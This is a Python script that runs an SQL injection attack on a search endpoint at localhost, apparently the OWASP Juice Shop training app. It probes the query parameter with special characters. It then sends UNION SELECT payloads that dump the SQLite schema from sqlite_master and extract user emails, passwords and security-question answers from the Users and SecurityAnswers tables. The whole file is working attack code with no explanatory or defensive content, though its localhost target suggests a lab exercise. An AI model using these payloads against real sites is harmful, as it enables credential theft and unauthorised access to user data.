import requests
import random
import json

def main ():
    check_search_query()

    input("Press enter to continue...")
    random_union_based_attack()

    input("Press enter to continue...")
    get_tables()
    
    
def check_search_query():
    print("CHECKING IF SEARCH QUERY IS INJECTABLE\n")
    url = "http://localhost:3000/rest/products/search?q=a"
    # confirm we can reach the website
    try: 
        response = requests.get(url)

    except requests.exceptions.RequestException:
        print("Error occured while requesting " + url)
        return

    payloads = [
        "\"", "\b", "%", ";", "--", "/*", "*/", "`", "\\", 
        "0x00", "0x1a", "0x1b", "0x1c", "0x1d", "0x1e", "0x1f", 
        "0x7f", "0x80", "0x81", "0x82", "0x83", "0x84", "0x85", 
        "0x86", "0x87", "0x88", "0x89", "0x8a", "0x8b", "0x8c", 
        "0x8d", "0x8e", "0x8f", "0x90", "0x91", "0x92", "0x93", 
        "0x94", "0x95", "0x96", "0x97", "0x98", "0x99", "0x9a", 
        "0x9b", "0x9c", "0x9d", "0x9e", "0x9f", "0xa0", "'", 
    ]

    for payload in payloads:
        
        print(f"testing payload: {payload} \n")
        full_url = url + payload

        try:
            response = requests.get(full_url, headers={'Accept':'application/json'}) #as json
            response.raise_for_status()
        except requests.exceptions.HTTPError as e:
            # print raw error
            print("Error",e.response.json())

        json = response.json()
        print(json)

def random_union_based_attack():
    payloads = [
        "a\')) UNION SELECT null, sql, null, null FROM sqlite_master--",
        "a\')) UNION SELECT name, type, sql, null FROM sqlite_master--",
        "a\')) UNION SELECT null, null, null, null--",
        "a\')) UNION SELECT 1, 2, 3, 4;--",
        "a\')) UNION SELECT 1, 2, 3, 4, 5;--",
        "a\')) UNION SELECT 1, 2, 3, 4, 5, 6;--",
        "a\')) UNION SELECT 1, 2, 3, 4, 5, 6, 7;--",
        "a\')) UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8;--",
        "a\')) UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9;--",
        "a\')) UNION SELECT sql, 2, 3, 4, 5, 6, 7, 8, 9 from sqlite_master;--" # this final one gives us the schema
    ]
    url = "http://localhost:3000/rest/products/search?q="
    for payload in payloads:
        
        full_url = url + payload

        print(f"testing payload: {full_url} \n")
        
        try:
            response = requests.get(full_url, headers={'Accept': 'application/json'})
            response.raise_for_status()
        except requests.exceptions.HTTPError as e:
            print("Error", e.response.json(), "\n")
            continue
        
        json = response.json()
        print_json_nicely(json)

def get_tables():
    payloads = [
        "a\')) UNION SELECT id, email, password, 4, 5, 6, 7, 8, 9 FROM Users--",
        "a\')) UNION SELECT UserId, SecurityQuestionId, answer, 4, 5, 6, 7, 8, 9 FROM SecurityAnswers--",
        "a\')) UNION SELECT id, question, 3, 4, 5, 6, 7, 8, 9 FROM SecurityQuestions--"
    ]
    url = "http://localhost:3000/rest/products/search?q="
    for payload in payloads:
        
        full_url = url + payload

        print("testing payload: ", full_url)
        
        try:
            response = requests.get(full_url, headers={'Accept': 'application/json'})
            response.raise_for_status()
        except requests.exceptions.HTTPError as e:
            print("Error", e.response.json())
            continue
        
        json = response.json()
        print_json_nicely(json)
    


def print_json_nicely(json_data):
    print(json.dumps(json_data, indent=4, sort_keys=True))


if __name__ == "__main__":
    main()

